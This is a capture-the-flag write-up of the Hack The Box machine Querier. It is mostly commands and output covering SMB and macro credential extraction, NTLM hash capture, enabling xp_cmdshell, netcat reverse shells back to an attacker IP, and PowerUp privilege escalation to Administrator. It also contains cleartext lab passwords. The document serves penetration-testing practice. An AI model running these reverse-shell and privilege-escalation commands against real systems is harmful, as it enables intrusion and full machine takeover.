# Recon & Enum

### Rustscan & Nmap
```bash
awk -F: '{print $2}' rustscan.txt | paste -sd ","

sudo nmap -sC -sV -oA nmap -p 135,139,445,1433,5985,47001,49664,49666,49665,49669,49667,49668,49671,49670 $IP
```

### SMB
```bash
smbclient -N -L \\\\$IP

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
SMB1 disabled -- no workgroup available

smbclient \\\\$IP\\Reports
Password for [WORKGROUP\alvin]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jan 29 12:23:48 2019
  ..                                  D        0  Tue Jan 29 12:23:48 2019
  Currency Volume Report.xlsm         A    12229  Mon Jan 28 11:21:34 2019

pipx install oletools
  installed package oletools 0.60.1, installed using Python 3.11.6
  These apps are now globally available
    - ezhexviewer
    - ftguess
    - mraptor
    - msodde
    - olebrowse
    - oledir
    - olefile
    - oleid
    - olemap
    - olemeta
    - oleobj
    - oletimes
    - olevba
    - pyxswf
    - rtfobj
done! ✨ 🌟 ✨

olevba Currency\ Volume\ Report.xlsm

conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
```

### MSSQL as reporting
```bash
impacket-mssqlclient reporting@$IP
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Encryption required, switching to TLS
[-] ERROR(QUERIER): Line 1: Login failed for user 'reporting'.

impacket-mssqlclient reporting@$IP -windows-auth
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (QUERIER\reporting  reporting@volume)> xp_cmdshell
[-] ERROR(QUERIER): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (QUERIER\reporting  reporting@volume)> EXECUTE sp_configure 'show advanced options', 1
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
```

##### Get Net-NTLMv2
* https://github.com/A1vinSmith/OSEP/tree/main/HTB/Windows/Escape#get-net-ntlmv2

```bash
MSSQL-SVC::QUERIER:aaaaaaaaaaaaaaaa:cb7a897345aae220832f30d0a7e9209a:010100000000000000803f1dda1cda016aaf983218bfd25a000000000100100078004c0045004f0059004200770066000300100078004c0045004f005900420077006600020010004f0049004300790050006a0051004b00040010004f0049004300790050006a0051004b000700080000803f1dda1cda01060004000200000008003000300000000000000000000000003000003349fde686d4a923ba2976234351f1203580a4150fba6ac04a1b523f3b5ab5ec0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e0031003200000000000000000000000000:corporate568
```

`evil-winrm -i $IP -u MSSQL-SVC -p corporate568` failed

### MSSQL as MSSQL-SVC
```bash
impacket-mssqlclient MSSQL-SVC@$IP <- Not working
impacket-mssqlclient MSSQL-SVC:corporate568@$IP -windows-auth

SQL (QUERIER\mssql-svc  dbo@master)> SELECT * FROM fn_my_permissions(NULL, 'SERVER');
entity_name   subentity_name   permission_name                   
-----------   --------------   -------------------------------        
server                         CONTROL SERVER  <- It required by xp_cmdshell and we have it
```

* https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#execute-os-commands

```bash
SQL (QUERIER\mssql-svc  dbo@master)> EXECUTE sp_configure 'show advanced options', 1
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (QUERIER\mssql-svc  dbo@master)> RECONFIGURE
SQL (QUERIER\mssql-svc  dbo@master)> sp_configure 'xp_cmdshell', '1'
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (QUERIER\mssql-svc  dbo@master)> RECONFIGURE
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell whoami
output              
-----------------   
querier\mssql-svc   

NULL 

xp_cmdshell "dir c:\users"
xp_cmdshell "type c:\users\mssql-svc\desktop\user.txt"
```

Direct reverseshell blocked by `This script contains malicious content and has been blocked by your antivirus`.

# Shell as mssql_svc
```bash
cd ~/Public

impacket-smbserver as . -smb2support <- "as is the share name, Nice since we don't need to deal with /etc/samba/conf.."

SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell \\10.10.16.12\as\nc.exe -e cmd.exe 10.10.16.12 80 <- as here Alvin Smith

sudo rlwrap -cAr nc -lvnp 80
listening on [any] 80 ...
connect to [10.10.16.12] from (UNKNOWN) [10.129.141.62] 49680
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

The Hack-tools plugin also shows the new versions of Windows block unauthenticated guest access!
To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine:
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user johnDoe -password Sup3rP@ssw0rd!

net use z: \\10.10.16.12\share /user:johnDoe Sup3rP@ssw0rd!

copy \\10.10.16.12\nc.exe
```

# Shell as Administrator
### Enum
```bash
locate PowerUp

/usr/share/powershell-empire/empire/server/data/module_source/privesc/PowerUp.ps1
/usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1

cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 ~/Public
```
```cmd
c:\Users\mssql-svc\Documents>copy \\10.10.16.12\as\PowerUp.ps1

c:\Users\mssql-svc\Documents>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\mssql-svc\Documents> Import-Module .\PowerUp.ps1 (. .\PowerUp.ps1 does the same)
Import-Module .\PowerUp.ps1

PS C:\Users\mssql-svc\Documents> Invoke-PrivescAudit
Invoke-PrivescAudit


Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2352
ProcessId   : 4280
Name        : 4280
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files

evil-winrm -i $IP -u Administrator -p 'MyUnclesAreMarioAndLuigi!!1!'
```

```bash
impacket-wmiexec administrator:'MyUnclesAreMarioAndLuigi!!1!'@$IP
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
querier\administrator
```

# Beyond root
It doesn't work for me * https://0xdf.gitlab.io/2019/06/22/htb-querier.html#beyond-root

```cmd
PS C:\Users\mssql-svc\Documents> Invoke-ServiceAbuse -Name 'UsoSvc' -Command "\\10.10.16.12\as\nc.exe -e cmd.exe 10.10.16.12 443"
Invoke-ServiceAbuse -Name 'UsoSvc' -Command "\\10.10.16.12\as\nc.exe -e cmd.exe 10.10.16.12 443"

ServiceAbused Command                                           
------------- -------                                           
UsoSvc        \\10.10.16.12\as\nc.exe -e cmd.exe 10.10.16.12 443
```